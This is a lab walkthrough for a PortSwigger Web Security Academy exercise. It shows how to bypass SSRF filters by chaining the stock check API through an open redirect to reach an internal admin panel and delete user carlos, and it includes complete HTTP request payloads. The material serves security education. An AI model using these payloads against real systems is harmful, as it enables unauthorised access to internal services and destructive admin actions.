# 🧪 PortSwigger Lab Walkthrough: SSRF with Filter Bypass via Open Redirection

## 🧠 Lab Overview
This walkthrough covers the **Server-Side Request Forgery (SSRF)** lab titled **“SSRF with filter bypass via open redirection”** from the [PortSwigger Web Security Academy](https://portswigger.net/web-security/ssrf). The lab simulates a real-world scenario where SSRF protections are in place, and the attacker must use an open redirect vulnerability to bypass them.

## 🎯 Objective
- Exploit SSRF to access an internal admin interface at `http://192.168.0.12:8080/admin`
- Use the access to delete the user `carlos`
- Bypass SSRF filters using an open redirection vulnerability in the application

## ⚙️ Environment Setup
### Required Tools
- [Burp Suite](https://portswigger.net/burp) (Community or Professional Edition)
- [FoxyProxy](https://getfoxyproxy.org/) browser extension
- PortSwigger Academy account

### Configuration
1. Launch Burp Suite and configure your browser to route traffic through it using FoxyProxy.
2. Ensure **Intercept** is off and **HTTP History** is enabled.
3. Open the lab in your browser and navigate to any product page.

## 🚀 Exploitation Steps
### Step 1: Identify the Stock Check Feature
- On any product page, scroll to the bottom-right corner and click **Next Product**
- In Burp Suite, go to `Proxy → HTTP History`
- Locate two key requests:
  - `POST /product/stock` → This is the **stock check API**
  - `GET /product/nextProduct?...` → Contains a `path` parameter and performs a **redirect**

### Step 2: Send Requests to Repeater
- Right-click both requests and choose **Send to Repeater** (`Ctrl+R`)
- Review the redirect request. It looks like:
  ```
  GET /product/nextProduct?currentProductId=1&path=/product?productId=2
  ```
- This confirms that the application uses the `path` parameter to redirect internally

### Step 3: SSRF Filter Bypass via Open Redirect
- The stock check API restricts access to internal IPs directly
- To bypass this, use the redirect endpoint to proxy your request to the internal admin interface

#### Modify the stock check request:
```http
POST /product/stock HTTP/1.1
Host: <lab-host>
Content-Type: application/x-www-form-urlencoded

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/
```
- Send the request. A `200 OK` response indicates successful access to the admin panel

### Step 4: Delete the User `carlos`
- Now craft a request to the delete endpoint via the redirect:
```http
POST /product/stock HTTP/1.1
Host: <lab-host>
Content-Type: application/x-www-form-urlencoded

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
- Send the request. If successful, the lab will display a **Solved** message

## 🧠 Key Takeaways

| Concept            | Explanation                                                                 |
|--------------------|------------------------------------------------------------------------------|
| SSRF               | Server-side vulnerability allowing attackers to make arbitrary requests from the server |
| Open Redirect      | A flaw that allows redirection to attacker-controlled URLs                   |
| Filter Bypass      | Circumventing SSRF protections using trusted redirect chains                 |
| Internal Services  | Often hosted on private IPs and accessible only from within the network      |

## 📚 Further Reading
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [OWASP SSRF Guide](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [SSRF Bypass Techniques](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

## ⚠️ Disclaimer
> This walkthrough is intended for **educational purposes only**. All testing was performed in a controlled environment provided by PortSwigger Web Security Academy. Do **not** attempt to exploit SSRF or any other vulnerabilities on systems you do not own or have explicit permission to test. Unauthorized access to computer systems is illegal and unethical.
